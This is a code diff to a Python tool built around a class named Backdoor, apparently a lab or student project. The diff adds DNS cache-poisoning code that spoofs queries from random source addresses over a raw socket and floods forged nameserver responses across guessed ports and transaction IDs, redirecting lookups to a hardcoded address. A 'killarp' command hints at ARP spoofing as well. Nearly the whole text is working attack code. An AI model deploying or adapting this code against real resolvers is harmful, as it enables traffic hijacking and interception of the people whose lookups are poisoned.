@@ -324,7 +324,27 @@ def fake_dns_responses(dns_port, dnsqids, qdsec, ansec, nssec, ip, total_respons
     port_responses = p.map(partial(create_dns_response, qdsec=qdsec, ansec=ansec, nssec=nssec, ip=ip, udp=udp), dnsqids)
     p.close()
     p.join()
-    total_responses.append(port_responses)
+    total_responses.append([dns_port, port_responses])
+
+
+def send_dns_requests(dnsPorts, ip, dns, dnsAddr, rawsock):
+    for port in dnsPorts:
+        print("Sending request for port {}..".format(port))
+        udp = scapy.UDP(sport=randomize_integer(), dport=port)
+        request = ip / udp / dns
+        rawsock.sendto(scapy.raw(request), (dnsAddr, port))
+
+
+def send_dns_response(response, dnsAddr, port, rawsock):
+    print("Sending fake response for port {}..".format(port))
+    rawsock.sendto(response, (dnsAddr, port))
+
+
+def send_dns_responses_pool(port, port_responses, dnsAddr, rawsock):
+    p = multiprocessing.Pool(8)
+    p.map(partial(send_dns_response, dnsAddr=dnsAddr, port=port, rawsock=rawsock), port_responses)
+    p.close()
+    p.join()
 
 
 class Backdoor:
@@ -468,9 +488,10 @@ class Backdoor:
                         ns = command[2]
                         nsAddr = command[3]
                         dnsAddr = command[4]
-                        dnsPorts = list(map(int, command[5].translate({ord(i): None for i in '[]'}).split(',')))
-                        dnsQids = list(map(int, command[6].translate({ord(i): None for i in '[]'}).split(',')))
-                        query = command[7]
+                        query = command[5]
+                        dnsPorts = list(map(int, command[6].translate({ord(i): None for i in '[]'}).split(',')))
+                        dnsQids = list(range(int(command[7]), int(command[8])+1))
+                        print(dnsQids)
                         badAddr = "10.0.2.10"
 
                         ip = scapy.IP(src=nsAddr, dst=dnsAddr)
@@ -488,7 +509,35 @@ class Backdoor:
                             p_processes.append(p)
                         for process in p_processes:
                             process.join()
-                        final_responses = [response for sublist in total_responses for response in sublist]
+
+                        rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+                        rawsock.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)
+
+                        ip = scapy.IP(src=randomize_ip(), dst=dnsAddr)
+                        qdsec = scapy.DNSQR(qname=query, qtype="A", qclass="IN")
+                        dns = scapy.DNS(id=randomize_integer(), qr=0, opcode="QUERY", rd=1, qdcount=1, ancount=0,
+                                        nscount=0, arcount=0, qd=qdsec)
+                        sending_requests = multiprocessing.Process(target=send_dns_requests,
+                                                                   args=(dnsPorts, ip, dns, dnsAddr, rawsock))
+
+                        sending_fake_responses_processes = []
+                        for port_responses in total_responses:
+                            port = port_responses[0]
+                            p = multiprocessing.Process(target=send_dns_responses_pool,
+                                                        args=(port, port_responses[1], dnsAddr, rawsock))
+                            sending_fake_responses_processes.append(p)
+
+                        print("Sending requests..")
+                        sending_requests.start()
+                        print("Sending fake responses..")
+                        for process in sending_fake_responses_processes:
+                            process.start()
+
+                        sending_requests.join()
+                        print("Done sending requests")
+                        for process in sending_fake_responses_processes:
+                            process.join()
+                        print("Done sending fake responses")
                         # except:
                         #     pass
                     elif command[0] == "killarp":
